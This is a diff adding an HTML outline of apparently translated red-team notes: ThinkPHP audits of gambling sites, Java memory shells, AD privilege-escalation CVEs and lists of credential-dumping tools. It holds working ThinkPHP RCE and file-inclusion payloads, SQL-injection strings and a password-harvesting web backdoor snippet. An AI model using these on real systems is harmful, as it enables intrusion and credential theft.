+<li>defineClass (defines a Java class): if any ClassLoader's defineClass is invoked with the corresponding bytecode, the JVM loads that class (and if the class extends or implements a class or interface, the parent class/interface is loaded first). The one caveat is that when a custom ClassLoader loads a class, its package name must not start with java., otherwise an exception is thrown.</li>
+<li>resolveClass (links the specified Java class)</li>
+<li>The webshell defines an equals method and calls fillContext to pass in the pageContext, then obtains the request, response, and session objects from pageContext</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>BCEL ClassLoader<ul>
+<li>com.sun.org.apache.bcel</li>
+<li>Bundled in the JDK<ul>
+<li>JDK &lt; 8u251</li>
+<li>rt.jar</li>
+</ul>
+</li>
+<li>tomcat7: <a href="http://org.apache.tomcat.dbcp.dbcp.basicdatasource/">org.apache.tomcat.dbcp.dbcp.BasicDataSource</a></li>
+<li>Tomcat 8 and later: <a href="http://org.apache.tomcat.dbcp.dbcp2.basicdatasource/">org.apache.tomcat.dbcp.dbcp2.BasicDataSource</a></li>
+<li>In loadClass(), createClass() uses substring() to cut the string after $$BCEL$$, then calls Utility.decode to decode it and returns the byte array. It then creates a Parser and calls parse() to produce a JavaClass object, gets that object's byte array, and calls Java's native defineClass() to load it, achieving class loading.</li>
+</ul>
+</li>
+<li>Command execution</li>
+<li>Directly or indirectly call newTransformer or getOutputProperties, eventually reaching defineTransletClasses, which redefines the bytecode stored in the _bytecodes field as a class in the JVM; calling newInstance on it then triggers the code in its static block or no-arg constructor.</li>
+<li>cc</li>
+<li>c3p0</li>
+<li>0XACED005</li>
+</ul>
+<h3 id="hands-on-php-code-audit">Hands-on PHP Code Audit</h3>
+<h4 id="bc-site-source-code-audit-for-getshell-hands-on_1">BC Site Source-Code Audit for Getshell (Hands-on)</h4>
+<ul>
+<li>Installation</li>
+<li>composer</li>
+<li>git</li>
+<li>Manually copy the package</li>
+<li>docker</li>
+<li>Differences between TP3 and TP5</li>
+<li>3<ul>
+<li>Directory names start with an uppercase letter</li>
+</ul>
+</li>
+<li>5/6<ul>
+<li>Directory names start with a lowercase letter</li>
+</ul>
+</li>
+<li>Logs are stored in different locations</li>
+<li>Architecture</li>
+<li>runtime<ul>
+<li>Page cache</li>
+<li>Cache::set</li>
+<li>session</li>
+<li>log-&gt;session id</li>
+</ul>
+</li>
+<li>application/6-app<ul>
+<li>Holds the project source code</li>
+</ul>
+</li>
+<li>thinkphp<ul>
+<li>Framework source code</li>
+<li>6-/vendor/topthink/framework/src/think</li>
+</ul>
+</li>
+<li>vender<ul>
+<li>Extension libraries installed by Composer</li>
+</ul>
+</li>
+<li>extend<ul>
+<li>Manually placed third-party libraries or self-wrapped libraries</li>
+</ul>
+</li>
+<li>Routing modes</li>
+<li>tp3<ul>
+<li>
+<h1 id="tp32-thinkphpconfconventionphp-return-array-url_model-1-url-modes-0-normal-1-pathinfo-default-2-rewrite-3-compatible-static-routing-url_router_on-false-url_route_rules-array">tp3.2.* /ThinkPHP/Conf/convention.php return array( 'URL_MODEL'              =&gt; 1, // URL modes: 0 (normal); 1 (PATHINFO, default); 2 (REWRITE); 3 (compatible) // Static routing: 'URL_ROUTER_ON' = false, 'URL_ROUTE_RULES' = array(), )</h1>
+</li>
+</ul>
+</li>
+<li>tp5</li>
+<li>tp6<ul>
+<li>No configuration needed; accessible via pathinfo and compatibility mode. Only routing config is supported, with self-defined dynamic and static route rules set through the Route class. If forced routing is enabled, all requests must match a route rule to succeed. The config path is /config/route.php</li>
+<li>Route::get</li>
+<li>Route::rule</li>
+<li>Route::xxx</li>
+</ul>
+</li>
+<li>SQL injection</li>
+<li>count and max methods call parseKey without filtering<ul>
+<li>5.0.0/5.0.23/tp3</li>
+</ul>
+</li>
+<li>ThinkPHP/Library/Think/Model.class.php::_parseOptions directly concatenates the PDO parameter $option</li>
+<li>parseWhereItem in ThinkPHP\Library\Think\Db\Driver.class.php directly concatenates and processes where query expressions<ul>
+<li>bind expression: ThinkPHP &lt;= 3.2.4</li>
+<li>between expression: ThinkPHP 3.1.*-3.2.0</li>
+<li>eq/neq/gt expression: ThinkPHP 3.2.*</li>
+<li>id[]=bind&amp;id[]=1%27&amp;tel[]=112312616&amp;email=admin@emal.com</li>
+</ul>
+</li>
+<li>parseData in thinkphp/library/think/db/Builder.php calls parseKey without filtering<ul>
+<li>5.0.13&lt;=ThinkPHP&lt;=5.0.15 (inc/dec), 5.1.0&lt;=ThinkPHP&lt;=5.1.5 (exp/inc/dec)</li>
+<li>username[0]=exp&amp;username[1]=updatexml(1,concat(1,user(),1),1)&amp;username[2]=2</li>
+</ul>
+</li>
+<li>Betting<ul>
+<li>News already viewed</li>
+<li>Check-in | campaign<ul>
+<li>Wheel of fortune</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>rce</li>
+<li>Request::__construct variable override + Request::input code execution<ul>
+<li>ThinkPHP [5.0.0, 5.0.23]</li>
+<li>Exploitation conditions</li>
+<li>trace + forced routing (url_route_on and url_route_must enabled)<ul>
+<li>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</li>
+</ul>
+</li>
+<li>debug + url_route_on routing enabled (default)<ul>
+<li>_method=__construct&amp;filter[]=system&amp;get[]=id</li>
+</ul>
+</li>
+<li>$dispatch['method'] + url_route_on routing enabled (default)<ul>
+<li>?s=captcha_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=id</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>In $dispatch['module'] mixed mode, the unfiltered controller App::invokemethod reflection can call any class, leading to code execution<ul>
+<li>ThinkPHP [5.0.0, 5.0.23], ThinkPHP [5.1.0, 5.1.30]</li>
+<li>url_route_on enabled by default (mixed mode)</li>
+<li>/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</li>
+</ul>
+</li>
+<li>think\process\pipes\Windows:__destruct arbitrary file deletion</li>
+<li>LoadLangPack.php::switchLangSet() multi-language mode inclusion<ul>
+<li>Affected versions: ThinkPHP v6.0.1-v6.0.13, v5.0.x, v5.1.x</li>
+<li>Direct RCE requires deploying the framework in Docker and PHP with the pear extension enabled (compiled with --with-pear), or a PHP build with the pear extension installed and enabled; including the file is enough.</li>
+<li>Steps</li>
+<li>GET /index.php?+config-create+/&amp;lang=../../../../../../../../../usr/local/lib/php/pearcmd&amp;/+/<?=phpinfo();?>+/tmp/test.php HTTP/1.1</li>
+<li>GET /index.php?lang=../../../../../../../../tmp/test HTTP/1.1</li>
+</ul>
+</li>
+<li>View::assign() template variable override + file inclusion<ul>
+<li>Affected versions: ThinkPHP 3.2.*, ThinkPHP [5.0.0, 5.0.18], ThinkPHP [5.1.0, 5.1.10]</li>
+<li>Conditions</li>
+<li>Variables assigned to the template via View::assign(), or their contents, are controllable.</li>
+<li>Must be paired with an uploaded image shell, log file, backup file, or similar to forge a normal-looking file, then request its inclusion.</li>
+</ul>
+</li>
+<li>Authentication/authorization</li>
+<li>Route class dynamic parameters<ul>
+<li>Route::get('view/:name$', 'News/read')-&gt;option('rule', 'admin');</li>
+</ul>
+</li>
+<li>
+<ol>
+<li>Set up authentication middleware (route whitelist)</li>
+<li>Route::rule('hello/:name','hello')-&gt;middleware('Auth');</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>Pre/post action checks: beforeAction and afterAction</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>Captcha login</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>Implement an auth class and a third-party RBAC-based authorization library</li>
+</ol>
+</li>
+<li>file_get_content</li>
+<li>Arbitrary file read</li>
+<li>ssrf<ul>
+<li>fsockopen</li>
+<li>readfile</li>
+<li>fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf</li>
+<li>file</li>
+<li>highlight_file/show_source</li>
+<li>parse_ini_file</li>
+<li>simplexml_load_file</li>
+</ul>
+</li>
+<li>curl</li>
+<li>php:input<ul>
+<li>/etc/passwd</li>
+</ul>
+</li>
+<li>extends</li>
+<li>Authorization class<ul>
+<li>If absent, endpoints are accessible without authorization</li>
+<li>but the route must be reachable</li>
+</ul>
+</li>
+<li>File upload</li>
+<li>Temporary files<ul>
+<li>Race condition</li>
+</ul>
+</li>
+<li>Extension validation</li>
+<li>phpinfo<ul>
+<li>Write files</li>
+</ul>
+</li>
+<li>XSS against the admin backend</li>
+<li>Bank cards</li>
+<li>XSS receiving platform</li>
+<li>is_dir/unlink</li>
+<li>File-operation functions trigger phar deserialization<ul>
+<li>CI4</li>
+</ul>
+</li>
+<li>unlink deletes some lock files<ul>
+<li>Limited value</li>
+</ul>
+</li>
+<li>xss</li>
+<li>htmlspecialchars does not escape single quotes by default</li>
+<li>Multiple encoding conversions</li>
+</ul>
+<h4 id="cp-site-source-code-audit-for-getshell-hands-on_1">CP Site Source-Code Audit for Getshell (Hands-on)</h4>
+<h4 id="zp-site-source-code-audit-for-getshell-hands-on">ZP Site Source-Code Audit for Getshell (Hands-on)</h4>
+<h4 id="tongda-oa-historical-vulnerabilities">Tongda OA Historical Vulnerabilities</h4>
+<h4 id="commercially-encrypted-php-code-php-admin-pages-of-iot-devices">Commercially Encrypted PHP Code / PHP Admin Pages of IoT Devices</h4>
+<ul>
+<li>Hook PHP DLL functions to dump plaintext</li>
+<li>Dump plaintext from memory</li>
+</ul>
+<h3 id="hands-on-net-site-code-audit">Hands-on .NET Site Code Audit</h3>
+<h4 id="java-memory-shell">Java Memory Shell</h4>
+<ul>
+<li>Loading process</li>
+<li>Tomcat architecture</li>
+<li>Loading security mechanisms</li>
+<li>Pervasiveness</li>
+<li>Difference between reflection and shell</li>
+</ul>
+<h4 id="net-memory-shell">.NET Memory Shell</h4>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/6v_JVnFsgIGGmC_wa3UZwQ">https://mp.weixin.qq.com/s/6v_JVnFsgIGGmC_wa3UZwQ</a></li>
+</ul>
+<h2 id="post-exploitation-lateral-movement">**Post-Exploitation Lateral Movement **</h2>
+<h3 id="server-and-personal-pc-reconnaissance-tools-and-methods">Server and Personal PC Reconnaissance Tools and Methods</h3>
+<h4 id="bypass-edr-to-obtain-hashes">Bypass EDR to Obtain Hashes</h4>
+<ul>
+<li>Basics</li>
+<li>ntlm<ul>
+<li>winlogon.exe -&gt; receives the user password -&gt; lsass.exe -&gt; compares it against the SAM table</li>
+</ul>
+</li>
+<li>Golden ticket</li>
+<li>Silver ticket</li>
+<li>Diamond ticket</li>
+<li>Sapphire ticket</li>
+<li>Unconstrained delegation</li>
+<li>Constrained delegation</li>
+</ul>
+<h3 id="domain-privilege-escalation-methods">Domain Privilege Escalation Methods</h3>
+<h4 id="privilege-escalation-via-wsus-and-sccm">Privilege Escalation via WSUS and SCCM</h4>
+<ul>
+<li><a href="https://github.com/AlsidOfficial/WSUSpendu">https://github.com/AlsidOfficial/WSUSpendu</a></li>
+<li>In-domain patch update server; the principle is similar to an EDR console pushing files and commands</li>
+<li><a href="https://github.com/xpn/sccmwtf">https://github.com/xpn/sccmwtf</a></li>
+<li>Push PowerShell</li>
+</ul>
+<h4 id="privilege-escalation-via-azure-ad">Privilege Escalation via Azure AD</h4>
+<ul>
+<li>Azure AD Sync</li>
+</ul>
+<h4 id="attack-the-mail-server">Attack the Mail Server</h4>
+<ul>
+<li>Where a domain admin has logged in</li>
+<li>Read through mail</li>
+<li>With WriteACL permission, grant yourself DCSync directly</li>
+<li><a href="https://github.com/dirkjanm/PrivExchange">https://github.com/dirkjanm/PrivExchange</a></li>
+</ul>
+<h4 id="bastion-host-ops-host">Bastion Host / Ops Host</h4>
+<h4 id="steal-passwords-via-web-backdoor">Steal Passwords via Web Backdoor</h4>
+<ul>
+<li>if ($_SERVER['REQUEST_METHOD'] == 'POST') {      $username = $_POST['username'];    $password = $_POST['password'];      $data = $username . ':' . $password . PHP_EOL;   file_put_contents('users.txt', $data, FILE_APPEND | LOCK_EX);</li>
+</ul>
+<h4 id="grab-hashes-from-servers-where-domain-admins-log-in">Grab Hashes from Servers Where Domain Admins Log In</h4>
+<h4 id="find-password-lists">Find Password Lists</h4>
+<h4 id="find-privileged-group-users">Find Privileged-Group Users</h4>
+<ul>
+<li>Administrator</li>
+<li>Backup Operators</li>
+</ul>
+<h4 id="cve-2014-6324-ms14-068">CVE-2014-6324 (MS14-068)</h4>
+<ul>
+<li>Prerequisites</li>
+<li>The domain controller has not applied the MS14-068 patch (KB3011780)</li>
+<li>Have compromised a domain-joined computer</li>
+<li>Have the domain user password and SID of that domain computer</li>
+<li>Vulnerability cause</li>
+<li>When the client initiates an authentication request, setting include-PAC to False means the returned TGT will not contain a PAC</li>
+<li>When the KDC validates the PAC, for the signature algorithm at the tail of the PAC, it allows any signature algorithm. As long as the client specifies an arbitrary signature algorithm, the KDC server will use that algorithm for signature verification. Therefore any forged content can be treated as valid, simply by appending the MD5 hash of the content as the signature<ul>
+<li>Craft a high-privilege PAC</li>
+<li>512, 520, 518, 519</li>
+</ul>
+</li>
+<li>The PAC is not placed in the TGT; it is placed elsewhere. The KDC can still correctly parse the PAC information that is not in the TGT. The PAC must be ciphertext, encrypted with a Key. The KDC takes the subkey from the Authenticator, decrypts the PAC information, and verifies the signature using the signature algorithm set by the client<ul>
+<li>enc-authorization-data</li>
+</ul>
+</li>
+<li>After the KDC successfully validates the TGT that lacks a PAC, it then validates the legitimacy of the PAC that is not in the TGT. If both validate successfully, the KDC extracts the User SID and Group SID from the PAC and re-signs them, using the same signature algorithm and key as when the include-pac flag is set to TRUE. The newly produced PAC is added to the decrypted TGT, which is then re-encrypted to make a brand new TGT and sent to the client<ul>
+<li>Because the requested service is krbtgt, the returned TGS ticket can be used as a TGT</li>
+</ul>
+</li>
+<li>deploy</li>
+</ul>
+<h4 id="cve-2020-1472">CVE-2020-1472</h4>
+<ul>
+<li>MS-NRPC</li>
+<li>AES-CFB8<ul>
+<li>Adds a 16-byte initialization vector (IV) in front of the plaintext to encrypt each byte of the plaintext, then applies AES to the IV and the first 16 bytes of the plaintext, takes the first byte of the AES output, and XORs it with the next plaintext byte</li>
+<li>For 1 out of 256 keys, applying AES-CFB8 encryption to an all-zero plaintext produces an all-zero ciphertext, thereby allowing authentication bypass</li>
+<li>Using the NetrServerPasswordSet2 method, a new password can be created for the client, encrypted with AES-CFB8 using the session key. The Netlogon plaintext password consists of 516 bytes, with the last four indicating the password length. By supplying 516 zeros, the password will be decrypted to 516 zeros, or an empty password</li>
+<li>server_auth = nrpc.hNetrServerAuthenticate3(      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,      target_computer + '\x00', ciphertext, flags    )</li>
+</ul>
+</li>
+</ul>
+<h4 id="cve-2021-1675cve-2021-34527-printnightmare">CVE-2021-1675/CVE-2021-34527 (PrintNightMare)</h4>
+<ul>
+<li>Print Spooler service</li>
+<li>RpcAddPrinterDriver<ul>
+<li>Allows remote printing and driver installation. This function is intended to give users with the Windows SeLoadDriverPrivilege privilege the ability to add drivers to a remote print spooler. This privilege is normally reserved for the built-in Administrators group and users of the Print Operators group who may have a legitimate need to install printer drivers on remote end-user machines.</li>
+<li>It allows any authenticated user to add print drivers to a Windows system without the above privilege, enabling attackers to achieve full remote code execution on the affected system as SYSTEM</li>
+</ul>
+</li>
+</ul>
+<h4 id="cve-2021-42287cve-2021-42278-nopac">CVE-2021-42287&amp;CVE-2021-42278 (noPac)</h4>
+<ul>
+<li>CVE-2021-42278: machine account names should generally end with $, but AD does not validate machine account names within the domain.</li>
+<li>CVE-2021-42287: create a machine account with the same name as the DC machine account (not ending with $). After requesting a TGT with that account, change the account name, then request a TGS ticket via S4U2Self. When the DC encrypts the TGS ticket in the TGS_REP phase, it cannot find that account to encrypt with the machine account hash, so the DC uses its own hash to encrypt the TGS ticket and provides a PAC belonging to that account, giving us a high-privilege ST</li>
+<li>MS-DS-Machine-Account-Quota=0</li>
+<li><strong>Need write permission on an account</strong><ul>
+<li>GenericAll</li>
+<li>Groups with write permission on certain <strong>machines or users</strong></li>
+<li>Domain-joined account</li>
+</ul>
+</li>
+</ul>
+<h4 id="privilege-escalation-via-domain-relay-vulnerabilities-adcs-vulnerabilities-etc">Privilege escalation via domain relay vulnerabilities, ADCS vulnerabilities, etc.</h4>
+<ul>
+<li>CVE-2022-26923</li>
+<li>DNShostname</li>
+<li>NTLM relay</li>
+<li>Responder</li>
+<li>Inveigh</li>
+<li>multirelayx.py</li>
+<li>PrinterBug</li>
+<li>PeitiPotam</li>
+<li>DFSCoerce</li>
+<li>ShadowCoerce</li>
+<li>PrivExchange</li>
+<li><a href="https://github.com/p0dalirius/Coercer">https://github.com/p0dalirius/Coercer</a></li>
+</ul>
+<h4 id="gain-domain-controller-privileges-via-distributed-com-users-or-performance-log-users">Gain domain controller privileges via Distributed-COM-Users or Performance-Log-Users</h4>
+<ul>
+<li><a href="https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/">https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/</a></li>
+</ul>
+<h4 id="obtain-the-azure-ad-connect-sync-account">Obtain the Azure AD Connect sync account</h4>
+<ul>
+<li>DC SYNC</li>
+</ul>
+<h4 id="analyze-group-policy">Analyze group policy</h4>
+<ul>
+<li><a href="https://github.com/synacktiv/gpoParser/tree/main">https://github.com/synacktiv/gpoParser/tree/main</a></li>
+</ul>
+<h4 id="httpsgithubcomevilashzpigadvulnscanner"><a href="https://github.com/evilashz/PIGADVulnScanner">https://github.com/evilashz/PIGADVulnScanner</a></h4>
+<h3 id="server-privilege-escalation">Server privilege escalation</h3>
+<h4 id="potato-series-privilege-escalation-principles-and-avedr-evasion">Potato series privilege escalation: principles and AV/EDR evasion</h4>
+<ul>
+<li>SeImpersonate: impersonate the client after authentication</li>
+<li>Windows 2000 SP4</li>
+<li>Services started by the Service Control Manager</li>
+<li>COM servers started by the COM infrastructure and configured to run under a specific account</li>
+<li>Members of the device local Administrators group</li>
+<li>Device local service accounts</li>
+<li>Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment<ul>
+<li>gpedit</li>
+</ul>
+</li>
+<li>This is applied to threads</li>
+<li>COM basics</li>
+<li>Every COM interface must inherit, directly or indirectly, from an interface named IUnknown. This interface provides baseline functionality that all COM objects must support<ul>
+<li>IUnknown</li>
+<li>QueryInterface<ul>
+<li>dynamic_cast</li>
+<li>hr = pFileOpen-&gt;QueryInterface(IID_IFileDialogCustomize,reinterpret_cast<void**>(&amp;pCustom));</li>
+</ul>
+</li>
+<li>AddRef<ul>
+<li>Object reference count</li>
+</ul>
+</li>
+<li>Release</li>
+</ul>
+</li>
+<li>COM events<ul>
+<li>event_source</li>
+<li>event_receiver</li>
+</ul>
+</li>
+<li>BSTR<ul>
+<li>When allocated, an extra 4-byte length field is stored in front of the string, recording the byte count of the string (excluding the trailing null character \0)</li>
+</ul>
+</li>
+<li>Memory<ul>
+<li>CoTaskMemAlloc</li>
+<li>CoTaskMemFree</li>
+</ul>
+</li>
+<li>__uuidof</li>
+<li>IID_PPV_ARGS<ul>
+<li>pFileOpen-&gt;QueryInterface(IID_PPV_ARGS(&amp;pCustom))</li>
+</ul>
+</li>
+<li>SafeRelease</li>
+<li>CComPtr<ul>
+<li>Does not explicitly call Release</li>
+<li>pFileOpen.CoCreateInstance(__uuidof(FileOpenDialog));</li>
+</ul>
+</li>
+<li>Rotten Potato</li>
+<li><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp</a></li>
+<li>SSPI<ul>
+<li>SSPI stands for Security Support Provider Interface, a Win32 API in the Windows operating system used to perform various security-related operations (such as authentication)</li>
+<li>SSP</li>
+<li>The Microsoft Security Support Provider Interface (SSPI) is the foundation of Windows authentication. Applications and infrastructure services that require authentication use SSPI, and the protocols used are the following SSP security protocols</li>
+<li>NTLM SSP<ul>
+<li>Challenge/Response verification mechanism</li>
+<li>The client uses NTLM SSP to generate an NTLM_NEGOTIATE message (called a TYPE 1 message) and sends it to the server.</li>
+<li>The server receives the TYPE 1 message from the client, passes it to NTLM SSP, gets an NTLM_CHALLENGE message (called a TYPE 2 message), and sends it back to the client. This message contains a random value generated by the server, called the challenge.</li>
+<li>The client receives the TYPE 2 message returned by the server and extracts the random challenge value. The client converts the password (123) into an LM HASH and NT HASH, and uses the computed LM HASH and/or NT HASH to perform some computation on the challenge.</li>
+<li>After the server receives the TYPE 3 message, it repeats the client's operation from step 3 and computes a hash. It then compares its own hash with the hash in the TYPE 3 message sent by the client. If they match, the client is verified successfully; otherwise verification fails.</li>
+</ul>
+</li>
+<li>Kerberos<ul>
+<li>Ticket-based authentication mechanism</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CoGetInstanceFromIStorage<ul>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage">https://learn.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage</a></li>
+</ul>
+</li>
+<li><a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</a></li>
+</ul>
+<h4 id="kernel-vulnerability-privilege-escalation">Kernel vulnerability privilege escalation</h4>
+<h3 id="ad-lateral-movement-methods-and-tool-evasion">AD lateral movement methods and tool evasion</h3>
+<h4 id="ad-reconnaissance-and-lateral-movement-via-rpc">AD reconnaissance and lateral movement via RPC</h4>
+<ul>
+<li>Lateral movement</li>
+<li><a href="https://github.com/XiaoliChan/wmiexec-Pro">https://github.com/XiaoliChan/wmiexec-Pro</a><ul>
+<li>Win32_ScheduledJob</li>
+</ul>
+</li>
+<li><a href="https://github.com/JDArmy/NO445-lateral-movement">https://github.com/JDArmy/NO445-lateral-movement</a><ul>
+<li>Win32_Process</li>
+</ul>
+</li>
+<li><a href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a></li>
+<li><a href="https://github.com/XiaoliChan/wmiexec-RegOut">https://github.com/XiaoliChan/wmiexec-RegOut</a></li>
+<li><a href="https://github.com/Mr-Un1k0d3r/SCShell">https://github.com/Mr-Un1k0d3r/SCShell</a><ul>
+<li>hRChangeServiceConfigW</li>
+</ul>
+</li>
+<li><a href="https://github.com/airzero24/WMIReg">https://github.com/airzero24/WMIReg</a><ul>
+<li>StdRegProv</li>
+</ul>
+</li>
+<li><a href="https://github.com/lexfo/rpc2socks">https://github.com/lexfo/rpc2socks</a><ul>
+<li>socks</li>
+</ul>
+</li>
+<li><a href="https://github.com/Marshall-Hallenbeck/ms_scmr">https://github.com/Marshall-Hallenbeck/ms_scmr</a><ul>
+<li>File upload, etc.</li>
+</ul>
+</li>
+<li><a href="https://github.com/zyn3rgy/smbtakeover">https://github.com/zyn3rgy/smbtakeover</a><ul>
+<li>Release the 445/tcp binding</li>
+</ul>
+</li>
+<li><a href="https://github.com/WKL-Sec/dcomhijack">https://github.com/WKL-Sec/dcomhijack</a><ul>
+<li>DLL hijacking related to DCOM</li>
+</ul>
+</li>
+<li><a href="https://github.com/zcgonvh/TaskSchedulerMisc">https://github.com/zcgonvh/TaskSchedulerMisc</a><ul>
+<li>MS-TSCH scheduled tasks</li>
+</ul>
+</li>
+<li>Reconnaissance</li>
+<li><a href="https://github.com/JDArmy/RPCSCAN">https://github.com/JDArmy/RPCSCAN</a><ul>
+<li>ms-epmap</li>
+</ul>
+</li>
+<li><a href="https://github.com/StarfireLab/EFSRPCrpc">https://github.com/StarfireLab/EFSRPCrpc</a><ul>
+<li>EFSRPC-ping</li>
+</ul>
+</li>
+<li>rpc</li>
+<li><a href="https://github.com/sogeti-esec-lab/RPCForge">https://github.com/sogeti-esec-lab/RPCForge</a><ul>
+<li>fuzz</li>
+</ul>
+</li>
+<li><a href="https://github.com/hfiref0x/WinObjEx64">https://github.com/hfiref0x/WinObjEx64</a><ul>
+<li>Windows object viewer</li>
+</ul>
+</li>
+<li><a href="https://github.com/tothi/serviceDetector">https://github.com/tothi/serviceDetector</a><ul>
+<li>Connect to 445 and query installed services via ms-lsat</li>
+</ul>
+</li>
+<li><a href="https://github.com/cyberark/RPCMon">https://github.com/cyberark/RPCMon</a><ul>
+<li>Monitor RPC</li>
+</ul>
+</li>
+<li><a href="https://github.com/zodiacon/WFPExplorer">https://github.com/zodiacon/WFPExplorer</a><ul>
+<li>Windows Filtering Platform objects</li>
+</ul>
+</li>
+<li><a href="https://github.com/CICADA8-Research/COMThanasia">https://github.com/CICADA8-Research/COMThanasia</a><ul>
+<li>COM object analysis tool</li>
+</ul>
+</li>
+</ul>
+<h4 id="ad-credential-and-password-collection">AD credential and password collection</h4>
+<ul>
+<li><a href="https://github.com/ly4k/PassTheChallenge">https://github.com/ly4k/PassTheChallenge</a></li>
+<li>Credential Guard credential protection service</li>
+<li><a href="https://github.com/ly4k/Pypykatz">https://github.com/ly4k/Pypykatz</a></li>
+<li>python mimikatz</li>
+<li><a href="https://github.com/praetorian-inc/ADFSRelay">https://github.com/praetorian-inc/ADFSRelay</a></li>
+<li>ADFS authentication relay</li>
+<li><a href="https://github.com/med0x2e/NTLMRelay2Self">https://github.com/med0x2e/NTLMRelay2Self</a></li>
+<li>web relay</li>
+<li><a href="https://github.com/deepinstinct/Lsass-Shtinkering">https://github.com/deepinstinct/Lsass-Shtinkering</a></li>
+<li>Windows Error Reporting service</li>
+<li><a href="https://github.com/tothi/rbcd-attack">https://github.com/tothi/rbcd-attack</a></li>
+<li>Resource-based constrained delegation</li>
+<li><a href="https://github.com/wjlab/Darksteel">https://github.com/wjlab/Darksteel</a></li>
+<li>Automated in-domain information gathering</li>
+<li><a href="https://github.com/lele8/SharpUserIP">https://github.com/lele8/SharpUserIP</a></li>
+<li>Extract login logs from the domain controller or remotely to quickly obtain the IP addresses corresponding to domain users</li>
+<li><a href="https://github.com/aleenzz/ADExplorerX">https://github.com/aleenzz/ADExplorerX</a></li>
+<li>AD browser</li>
+<li><a href="https://github.com/outflanknl/Dumpert">https://github.com/outflanknl/Dumpert</a></li>
+<li>System Calls<ul>
+<li>old</li>
+</ul>
+</li>
+<li><a href="https://github.com/zblurx/certsync">https://github.com/zblurx/certsync</a></li>
+<li>Certificate abuse</li>
+<li><a href="https://github.com/battleoverflow/lsass-dump">https://github.com/battleoverflow/lsass-dump</a></li>
+<li>Simple export demo</li>
+<li><a href="https://github.com/0x727/UserRegEnum_0x727">https://github.com/0x727/UserRegEnum_0x727</a></li>
+<li>Find logged-on users on all computers in the domain with a normal domain user's privileges</li>
+<li><a href="https://github.com/Avienma/DumpHash">https://github.com/Avienma/DumpHash</a></li>
+<li>Clean hash export, but requires high privileges</li>
+<li><a href="https://github.com/GamehunterKaan/Plog">https://github.com/GamehunterKaan/Plog</a></li>
+<li>mimikatz password export module</li>
+<li><a href="https://github.com/GhostPack/SharpDPAPI">https://github.com/GhostPack/SharpDPAPI</a></li>
+<li>Read-only DPAPI</li>
+<li><a href="https://github.com/mdsecactivebreach/DragonCastle">https://github.com/mdsecactivebreach/DragonCastle</a></li>
+<li>DLL hijacking to read hashes</li>
+<li><a href="https://github.com/expl0itabl3/EZDump">https://github.com/expl0itabl3/EZDump</a></li>
+<li>Simple export in C#</li>
+<li><a href="https://github.com/nettitude/ETWHash">https://github.com/nettitude/ETWHash</a></li>
+<li>Read hashes via ETW events</li>
+<li><a href="https://github.com/4ndr34z/ntlmthief">https://github.com/4ndr34z/ntlmthief</a></li>
+<li>Read hashes via SSPI</li>
+<li><a href="https://github.com/gabriellandau/PPLFault">https://github.com/gabriellandau/PPLFault</a></li>
+<li>Attack PPL process protection to read hashes</li>
+<li><a href="https://github.com/grimlockx/ADCSKiller">https://github.com/grimlockx/ADCSKiller</a></li>
+<li>ADCS exploitation tool</li>
+<li><a href="https://github.com/OmriBaso/RToolZ">https://github.com/OmriBaso/RToolZ</a></li>
+<li>Dump PPL Lsass using the ProcExp152.sys driver</li>
+<li><a href="https://github.com/BeichenDream/SharpToken">https://github.com/BeichenDream/SharpToken</a></li>
+<li>Find tokens leaked by all processes in the system</li>
+<li><a href="https://github.com/S12cybersecurity/RDPCredentialStealer">https://github.com/S12cybersecurity/RDPCredentialStealer</a></li>
+<li>Detours API hooking to read RDP login credentials</li>
+<li><a href="https://github.com/Heart-Sky/ListRDPConnections">https://github.com/Heart-Sky/ListRDPConnections</a></li>
+<li>List all RDP connection records</li>
+<li><a href="https://github.com/0neAtSec/SharpDomainInfo">https://github.com/0neAtSec/SharpDomainInfo</a></li>
+<li>Automated reconnaissance</li>
+<li><a href="https://github.com/Tw1sm/spraycharles">https://github.com/Tw1sm/spraycharles</a></li>
+<li>Slow password spraying</li>
+<li><a href="https://github.com/synacktiv/GPOddity">https://github.com/synacktiv/GPOddity</a></li>
+<li><a href="https://github.com/grayhatkiller/SharpExShell">https://github.com/grayhatkiller/SharpExShell</a></li>
+<li><a href="https://github.com/djackreuter/proc_noprocdump">https://github.com/djackreuter/proc_noprocdump</a></li>
+<li><a href="https://github.com/mtth-bfft/adeleg">https://github.com/mtth-bfft/adeleg</a></li>
+<li>Enumerate all delegations</li>
+<li><a href="https://github.com/ricardojoserf/NativeDump">https://github.com/ricardojoserf/NativeDump</a></li>
+<li><a href="https://github.com/MzHmO/LeakedWallpaper">https://github.com/MzHmO/LeakedWallpaper</a></li>
+<li>Extract hashes from sessions</li>
+<li><a href="https://github.com/Offensive-Panda/LsassReflectDumping">https://github.com/Offensive-Panda/LsassReflectDumping</a></li>
